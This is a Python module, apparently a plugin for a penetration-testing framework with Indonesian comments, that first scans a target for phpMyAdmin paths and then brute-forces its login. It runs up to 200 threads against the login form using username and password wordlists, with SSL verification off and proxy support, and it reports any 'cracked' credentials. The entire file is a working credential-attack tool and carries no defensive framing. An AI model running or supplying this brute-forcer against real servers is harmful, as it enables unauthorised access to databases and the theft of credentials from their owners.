import requests
import threading
import time
from pathlib import Path
import sys
import re
import urllib.parse
from queue import Queue  # SUDAH DITAMBAHKAN

# YAML
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

# Suppress SSL warnings
try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

# tqdm
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# Rich
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    from rich.text import Text
    from rich.align import Align
    from rich.live import Live
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False

MODULE_INFO = {
    "name": "bruteforce/phpmyadmin_ultrafast",
    "description": "Ultra fast phpMyAdmin bruteforce dengan progress bar yang tepat",
    "category": "auxiliary"
}

OPTIONS = {
    "TARGET": {"required": True, "default": "http://localhost/phpmyadmin", "description": "Target URL phpMyAdmin"},
    "USERNAME": {"required": True, "default": "root", "description": "Username atau file berisi usernames"},
    "PASSWORD": {"required": True, "default": "password", "description": "Password atau file berisi passwords"},
    "USER_AGENT": {"required": False, "default": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "description": "User-Agent"},
    "THREADS": {"required": False, "default": "50", "description": "Jumlah threads (1-200)"},
    "DELAY": {"required": False, "default": "0.01", "description": "Delay (detik)"},
    "TIMEOUT": {"required": False, "default": "3", "description": "Timeout (detik)"},
    "SSL_VERIFY": {"required": False, "default": "false", "description": "Verify SSL (true/false)"},
    "PROXY": {"required": False, "default": "", "description": "Proxy"},
    "MAX_ATTEMPTS": {"required": False, "default": "50000", "description": "Max attempts"},
    "CUSTOM": {"required": False, "default": "phpmyadmin_dir.yaml", "description": "Custom paths"}
}

def display_header():
    if not RICH_AVAILABLE: return
    header_text = Text()
    header_text.append("ULTRA FAST ", style="bold yellow")
    header_text.append("PHPMyAdmin ", style="bold cyan")
    header_text.append("BRUTEFORCE", style="bold green")
    sub_text = Text("High-Speed Credential Testing Tool", style="bold white")
    console.print(Panel(Align.center(header_text + "\n" + sub_text), border_style="bright_blue", padding=(1,2)))

class UltraFastTargetScanner:
    def __init__(self, base_target, headers, ssl_verify, timeout, proxies, custom_paths=None):
        self.base_target = base_target
        self.headers = headers
        self.ssl_verify = ssl_verify
        self.timeout = timeout
        self.proxies = proxies
        self.found_paths = []
        self.custom_paths = custom_paths or []

    def generate_paths_from_url(self, url):
        all_paths = self.load_paths_from_file("/data/data/com.termux/files/home/S/modules/phpmyadmin/wordlist/phpmyadmin_dir.yaml")
        all_paths.extend(self.custom_paths)
        return list(dict.fromkeys([p for p in all_paths if p]))

    def is_valid_version(self, v): 
        if not v: return False
        if re.match(r'^\d+\.\d+(\.\d+)?$', v):
            parts = [int(p) for p in v.split('.') if p.isdigit()]
            return all(0 <= p < 1000 for p in parts) and 2 <= parts[0] <= 6
        return False

    def load_paths_from_file(self, filepath):
        if YAML_AVAILABLE and filepath.lower().endswith(('.yml', '.yaml')):
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    return [str(p).strip() for p in (data if isinstance(data, list) else []) if p]
            except Exception as e:
                print(f"[!] YAML Error: {e}")
                return []
        else:
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    return [line.strip() for line in f if line.strip()]
            except: return []

    def scan_paths(self):
        paths = self.generate_paths_from_url(self.base_target)
        total = len(paths)
        if RICH_AVAILABLE:
            def build_panel(cur, tested, found, found_list):
                info = "\n\n[bold green]Found Paths:[/bold green]"
                for i, p in enumerate(found_list[:3]): info += f"\n  {i+1}. {p}"
                if len(found_list) > 3: info += f"\n  ... and {len(found_list)-3} more"
                left = f"[bold cyan]Fuzzing:[/bold cyan] [yellow]{cur}[/yellow]\n[bold blue]Tested:[/bold blue] [cyan]{tested}/{total}[/cyan]\n[bold green]Found:[/bold green] [green]{found}[/green]{info}"
                return Panel(Table.grid().add_row(left), title="Fuzzing Status", border_style="magenta", padding=(1,2))
            with Progress(*[TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeElapsedColumn(), TimeRemainingColumn()], console=console) as progress:
                task = progress.add_task("[cyan]Scanning...", total=total)
                found_list = []
                with Live(build_panel("-", 0, 0, []), refresh_per_second=6, console=console) as live:
                    for i, path in enumerate(paths):
                        cur = path or "/"
                        progress.update(task, description=f"[cyan]Fuzzing: {cur[:30]}...", advance=1)
                        url = f"{self.base_target.rstrip('/')}{cur}"
                        info = self.check_url_status(url)
                        if info.get("accessible"):
                            self.found_paths.append(info)
                            found_list.append(cur)
                            live.update(build_panel(cur, i+1, len(found_list), found_list))
                        else:
                            live.update(build_panel(cur, i+1, len(found_list), found_list))
                        time.sleep(0.005)
        else:
            pbar = tqdm(total=total, desc="Scanning", unit="path") if TQDM_AVAILABLE else None
            for path in paths:
                url = f"{self.base_target.rstrip('/')}{path or '/'}"
                info = self.check_url_status(url)
                if info.get("accessible"): self.found_paths.append(info)
                if pbar: pbar.update(1)
            if pbar: pbar.close()
        if self.found_paths and RICH_AVAILABLE: self.display_scan_results()
        return self.found_paths

    def check_url_status(self, url):
        try:
            r = requests.get(url, headers=self.headers, verify=self.ssl_verify, timeout=8, proxies=self.proxies, allow_redirects=True)
            v = self.detect_phpmyadmin_version(r.url, r.text, r.headers)
            return {"url": r.url, "status_code": r.status_code, "accessible": r.status_code in [200,301,302,401,403], "version": v, "server": r.headers.get('Server', 'N/A'), "title": self.extract_title(r.text)}
        except: return {"url": url, "accessible": False, "version": "Unknown"}

    def detect_phpmyadmin_version(self, url, html, headers):
        v = self.extract_version_from_html(html)
        return v if v != "Unknown" else self.check_url_for_version(url)

    def extract_version_from_html(self, html):
        if not html: return "Unknown"
        patterns = [r'phpMyAdmin[^<]*?([0-9]+\.[0-9]+\.[0-9]+)', r'Version[:\s]*([0-9]+\.[0-9]+\.[0-9]+)', r'v([0-9]+\.[0-9]+\.[0-9]+)']
        for p in patterns:
            m = re.findall(p, html[:300000], re.I)
            for mv in m:
                if self.is_valid_version(mv): return mv
        return "Unknown"

    def check_url_for_version(self, url):
        patterns = [r'phpmyadmin[-\s]*([0-9]+\.[0-9]+)', r'pma[-\s]*([0-9]+\.[0-9]+)']
        for p in patterns:
            m = re.findall(p, url, re.I)
            for mv in m:
                if self.is_valid_version(mv): return mv
        return "Unknown"

    def extract_title(self, html): 
        m = re.search(r'<title>(.*?)</title>', html, re.I)
        return m.group(1) if m else "No Title"

    def display_scan_results(self):
        table = Table(title="[*] Target Discovery Results", box=box.DOUBLE_EDGE, header_style="bold magenta")
        table.add_column("Status", style="bold")
        table.add_column("Path", style="cyan")
        table.add_column("URL", style="blue")
        table.add_column("Code", justify="center")
        table.add_column("Server", style="yellow")
        table.add_column("V", style="bold green", justify="center")
        for r in self.found_paths:
            emoji = {200: "Check", 301: "Repeat", 302: "Repeat", 403: "Prohibited", 401: "Lock"}.get(r['status_code'], "Question")
            path = urllib.parse.urlparse(r['url']).path
            v = f"[green]{r['version']}[/green]" if r['version'] != "Unknown" else f"[yellow]{r['version']}[/yellow]"
            table.add_row(emoji, path, f"{r['url'][:40]}...", f"[bold]{r['status_code']}[/bold]", r['server'][:15], v)
        console.print(Panel(table, title=f"[green]SCAN COMPLETED - Found {len(self.found_paths)} paths[/green]", border_style="green", padding=(1,1)))

class UltraFastLoginChecker:
    @staticmethod
    def check_login_success(r):
        t = r.text.lower()
        if any(x in t for x in ["mainframeset", "navigation.php", "server version"]): return True
        if any(x in t for x in ["access denied", "cannot log in", "login"]): return False
        return len(r.text) > 3000 and "login" not in t

class UltraFastPhpMyAdminBruteforce:
    def __init__(self, options):
        self.options = options
        self.credential_queue = Queue()
        self.results = {"found_credentials": [], "attempts": 0, "successful_attempts": 0, "start_time": None}
        self.stop_event = threading.Event()
        self.credentials_found = False
        self.progress_bar = None
        self.live = None
        self.setup_components()

    def setup_components(self):
        self.headers = {'User-Agent': self.options.get("USER_AGENT"), 'Accept': '*/*'}
        self.ssl_verify = self.options.get("SSL_VERIFY", "false").lower() == "true"
        self.threads = max(1, min(200, int(self.options.get("THREADS", "50"))))
        self.delay = float(self.options.get("DELAY", "0.01"))
        self.max_attempts = int(self.options.get("MAX_ATTEMPTS", "50000"))
        self.proxies = {"http": self.options.get("PROXY"), "https": self.options.get("PROXY")} if self.options.get("PROXY") else {}
        self.load_credentials_to_queue()
        self.target_scanner = UltraFastTargetScanner(self.options.get("TARGET"), self.headers, self.ssl_verify, 3, self.proxies)
        self.lock = threading.Lock()

    def load_credentials_to_queue(self):
        u = self.load_wordlist(self.options.get("USERNAME"))
        p = self.load_wordlist(self.options.get("PASSWORD"))
        t = len(u) * len(p)
        if RICH_AVAILABLE:
            console.print(Panel(f"[cyan]Credential Queue[/cyan]\nUsernames: [yellow]{len(u)}[/yellow]\nPasswords: [yellow]{len(p)}[/yellow]\nTotal: [red]{t:,}[/red]", border_style="blue", padding=(1,2)))
        for username in u:
            for password in p:
                if self.credential_queue.qsize() < self.max_attempts:
                    self.credential_queue.put((username, password))
                else: break
        self.total_attempts = min(t, self.max_attempts)

    def load_wordlist(self, s):
        try:
            if Path(s).is_file():
                with open(s, 'r', encoding='utf-8', errors='ignore') as f:
                    return [l.strip() for l in f if l.strip()]
            return [s]
        except: return [s]

    def create_session(self):
        s = requests.Session()
        s.headers.update(self.headers)
        a = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
        s.mount('http://', a); s.mount('https://', a)
        return s

    def run(self):
        display_header()
        found = self.target_scanner.scan_paths()
        if not found:
            if RICH_AVAILABLE: console.print(Panel("[bold red]TARGET NOT FOUND[/bold red]\nNo phpMyAdmin paths accessible!", border_style="red", padding=(1,2)))
            return
        self.start_bruteforce_with_proper_progress(found[0]["url"])
        self.display_final_results()

    def start_bruteforce_with_proper_progress(self, target_url):
        if RICH_AVAILABLE:
            console.print(Panel(f"[bold red]BRUTEFORCE STARTED[/bold red]\nTarget: [cyan]{target_url}[/cyan]\nTotal: [yellow]{self.total_attempts:,}[/yellow]\nThreads: [green]{self.threads}[/green]", border_style="red", padding=(1,2)))

        self.results["start_time"] = time.time()

        # Setup tqdm
        if TQDM_AVAILABLE:
            self.progress_bar = tqdm(
                total=self.total_attempts,
                desc="Crack",
                unit="attempt",
                dynamic_ncols=True,
                bar_format="{l_bar}{bar:20}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]",
                position=0,
                leave=True
            )
        else:
            self.progress_bar = None

        # Live Panel + fallback
        if RICH_AVAILABLE:
            def make_panel():
                table = Table.grid(expand=True)
                table.add_column(ratio=1); table.add_column(ratio=2)

                speed = f"{self.progress_bar.format_dict['rate'] or 0:,.0f}/s" if self.progress_bar else "0/s"
                eta = self.progress_bar.format_dict.get('remaining', '??:??') if self.progress_bar else "??:??"
                status = "[bold green]SUCCESS![/bold green]" if self.credentials_found else ("[bold red]STOPPED[/bold red]" if self.stop_event.is_set() else "Running")

                # AMAN: Jika tqdm tidak ada
                progress_display = self.progress_bar if self.progress_bar else "[dim]Progress bar disabled (pip install tqdm)[/dim]"

                table.add_row(
                    f"[bold cyan]Target:[/bold cyan] [white]{target_url[:50]}{'...' if len(target_url)>50 else ''}[/white]\n"
                    f"[bold yellow]Threads:[/bold yellow] [green]{self.threads}[/green]\n"
                    f"[bold magenta]Status:[/bold magenta] {status}\n"
                    f"[bold blue]Speed:[/bold blue] [yellow]{speed}[/yellow] | ETA: [magenta]{eta}[/magenta]",
                    progress_display
                )
                return Panel(table, title="[bold red]ULTRAFAST BRUTEFORCE ENGINE[/bold red]", border_style="bright_red", padding=(1,1))

            self.live = Live(make_panel(), refresh_per_second=10, console=console)
            self.live.start()

        # Start threads
        threads = [threading.Thread(target=self.bruteforce_worker, args=(target_url,), daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()

        # Monitor
        try:
            while not self.stop_event.is_set() and self.results["attempts"] < self.total_attempts and not self.credentials_found:
                time.sleep(0.1)
                if self.live: self.live.update(make_panel())
        except KeyboardInterrupt:
            self.stop_event.set()
            if RICH_AVAILABLE: console.print("\n[yellow]Interrupted by user[/yellow]")

        self.stop_event.set()
        for t in threads: t.join(timeout=2)

        if self.progress_bar: self.progress_bar.close()
        if self.live: self.live.stop()

        elapsed = time.time() - self.results["start_time"]
        avg = self.results["attempts"] / elapsed if elapsed > 0 else 0
        if RICH_AVAILABLE:
            console.print(Panel(f"[cyan]Time:[/cyan] {elapsed:.2f}s\n[green]Avg Speed:[/green] {avg:,.1f}/s\n[bold magenta]Status:[/bold magenta] {'[green]SUCCESS' if self.credentials_found else '[yellow]DONE'}", title="EXECUTION SUMMARY", border_style="cyan", padding=(1,2)))

    def bruteforce_worker(self, target_url):
        session = self.create_session()
        while not self.stop_event.is_set() and not self.credentials_found and self.results["attempts"] < self.total_attempts:
            try:
                username, password = self.credential_queue.get(timeout=1)
            except: break
            success = self.try_login(session, target_url, username, password)
            with self.lock:
                self.results["attempts"] += 1
                if TQDM_AVAILABLE and self.progress_bar:
                    self.progress_bar.update(1)
                if success:
                    self.results["successful_attempts"] += 1
                    self.results["found_credentials"].append((username, password))
                    self.credentials_found = True
                    self.stop_event.set()
                    if RICH_AVAILABLE:
                        console.print("\n" + "="*70)
                        console.print(Panel(f"[bold green]CRACKED![/bold green]\nUser: [cyan]{username}[/cyan]\nPass: [yellow]{password}[/yellow]\nAttempt: [blue]{self.results['attempts']:,}[/blue]", title="SUCCESS", border_style="bright_green", padding=(2,3)))
                        console.print("="*70)
            if self.delay > 0: time.sleep(self.delay)
            self.credential_queue.task_done()
        session.close()

    def try_login(self, s, url, u, p):
        try:
            login_url = f"{url}/index.php"
            s.get(login_url, verify=self.ssl_verify, timeout=2, proxies=self.proxies)
            r = s.post(login_url, data={'pma_username': u, 'pma_password': p, 'server': '1'}, verify=self.ssl_verify, timeout=2, proxies=self.proxies, allow_redirects=True)
            return UltraFastLoginChecker.check_login_success(r)
        except: return False

    def display_final_results(self):
        if not RICH_AVAILABLE: return
        summary = (
            f"[bold cyan]Target:[/bold cyan] {self.options.get('TARGET')}\n"
            f"[bold yellow]Total Attempts:[/bold yellow] {self.results['attempts']:,}\n"
            f"[bold green]Success:[/bold green] {self.results['successful_attempts']}\n"
            f"[bold red]Found:[/bold red] {len(self.results['found_credentials'])}\n"
            f"[bold magenta]Combinations:[/bold magenta] {self.total_attempts:,}"
        )
        console.print(Panel(summary, title="FINAL RESULTS", border_style="bright_blue", padding=(1,2)))
        if self.results["found_credentials"]:
            table = Table(title="CRACKED CREDENTIALS", box=box.DOUBLE_EDGE, header_style="bold green")
            table.add_column("Username", style="bold white", justify="center")
            table.add_column("Password", style="bold yellow", justify="center")
            table.add_column("Status", style="bold green", justify="center")
            for u, p in self.results["found_credentials"]:
                table.add_row(u, p, "VALID")
            console.print(Panel(table, title="SUCCESSFUL CRACKS", border_style="green", padding=(1,1)))
        else:
            console.print(Panel("[bold red]No credentials found[/bold red]\nTry different wordlists", border_style="red", padding=(1,2)))

def run(session, options):
    UltraFastPhpMyAdminBruteforce(options).run()
